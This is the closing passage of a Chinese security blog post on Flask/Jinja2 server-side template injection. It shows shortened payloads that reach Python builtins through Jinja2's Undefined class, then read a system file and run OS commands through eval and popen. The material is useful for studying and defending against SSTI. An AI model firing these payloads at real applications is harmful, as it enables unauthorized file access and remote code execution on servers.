+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image21.png" alt="pic21"></p>
+<p>是不是觉得这些 Payload<br>有些长了呢？那么有没有什么办法可以缩减一些长度呢？</p>
+<h2 id="0x04-解锁新姿势"><a href="#0x04-解锁新姿势" class="headerlink" title="0x04 解锁新姿势"></a>0x04 解锁新姿势</h2><h3 id="无意中的尝试"><a href="#无意中的尝试" class="headerlink" title="无意中的尝试"></a>无意中的尝试</h3><p>当我在编写脚本和将 Payload<br>输入浏览器的时候，因手误无意中组成了一个错误的 Payload ：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__().c.__init__.__globals__['__builtins__']['eval']('abs(-1)')&#125;&#125;
+</code></pre>
+<p>执行结果：</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image22.png" alt="pic14"></p>
+<p>竟然访问成功了！</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image23.jpeg"></p>
+<p>那么为什么会访问成功呢？</p>
+<p>().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() 理应返回的是 object<br>类型的所有子类的列表，是不应该包含 c 这个属性的。</p>
+<p>理论上应该造成服务端错误返回 500 ，服务器日志显示 AttributeError: ‘list’<br>object has no attribute ‘c’。但是结果却是成功执行了，这让我意识到 jinja2<br>的沙箱环境，跟普通 Python 运行环境还是有很多不同的。</p>
+<p>既然这样的话我们就看下这个 c 对象的 <strong>init</strong> 函数到底是个啥？</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__().c.__init__&#125;&#125;
+</code></pre>
+<p>执行结果： <img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image24.png" alt="pic15"></p>
+<p>竟然是一个 Undefined 类型，也就是说如果碰到未定义的变量就会返回为<br>Undefined 类型.而 Python 官方库是没有这个类型的，也就是说明这个<br>Undefined 是 jinja2 框架提供的。 我们在 jinja2 框架的源码中搜寻，最后在<br>runtime.py 中找到了 Undefined 这个 class：</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image25.png" alt="pic16"></p>
+<p>继承的是 object 类型，并且还有其他函数。 为了确认是这个 class<br>我们尝试使用 _fail_with_undefined_error ：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__().c._fail_with_undefined_error&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image26.png" alt="pic17"></p>
+<p>OK，确认过眼神，我遇见对的class !</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image27.jpeg"></p>
+<p>既然都是 Undefined 那我随便定义一个未被定义过的变量也应该是 Undefined ：</p>
+<pre><code>name=&#123;&#123;a.__init__.__globals__.__builtins__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image28.png" alt="pic18"></p>
+<p>既然 Undefined 类可以执行成功，那我们就可以看看他的全局 global<br>的内建模块中都包含什么了：</p>
+<pre><code>name=&#123;&#123;a.__init__.__globals__.__builtins__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image29.png" alt="pic19"></p>
+<p>老样子，还是可以看到几个敏感函数 eval、open 等等，应有尽有。</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image30.jpeg"></p>
+<h3 id="优化-Payload"><a href="#优化-Payload" class="headerlink" title="优化 Payload"></a>优化 Payload</h3><p>对此我们直接优化我们的 Payload，使长度大大缩短，可读性也变强了。</p>
+<p><strong>优化后的兼容 Python 2/3 版本的 Payload：</strong><br>读取文件：</p>
+<pre><code>&#123;&#123;a.__init__.__globals__.__builtins__.open("C:\Windows\win.ini").read()&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image31.png" alt="pic22"></p>
+<p>命令执行：</p>
+<pre><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()")&#125;&#125;
+</code></pre>
+<h2 id="0x05-最后"><a href="#0x05-最后" class="headerlink" title="0x05 最后"></a>0x05 最后</h2><p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image33.jpeg"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Python/" rel="tag"># Python</a>
+              <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag"># 模板注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/27/netcat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/" rel="next" title="netcat常用命令说明">
+      netcat常用命令说明 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x02前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask-%E5%92%8C-SSTI-%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.1.</span> <span class="nav-text">Flask 和 SSTI 介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jinja2-%E8%AF%AD%E6%B3%95"><span class="nav-number">2.2.</span> <span class="nav-text">jinja2 语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">沙箱绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03%E5%8E%9F%E7%90%86%E8%A7%A3%E8%AF%BB"><span class="nav-number">3.</span> <span class="nav-text">0x03原理解读</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95"><span class="nav-number">3.1.</span> <span class="nav-text">简单尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1"><span class="nav-number">3.2.</span> <span class="nav-text">绕过沙箱</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E8%A7%A3%E9%94%81%E6%96%B0%E5%A7%BF%E5%8A%BF"><span class="nav-number">4.</span> <span class="nav-text">0x04 解锁新姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%84%8F%E4%B8%AD%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="nav-number">4.1.</span> <span class="nav-text">无意中的尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%98%E5%8C%96-Payload"><span class="nav-number">4.2.</span> <span class="nav-text">优化 Payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%9C%80%E5%90%8E"><span class="nav-number">5.</span> <span class="nav-text">0x05 最后</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Edwater"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Edwater</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/edwatering" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;edwatering" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:edwatersec@gmail.com" title="E-Mail → mailto:edwatersec@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-shield"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Edwater</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
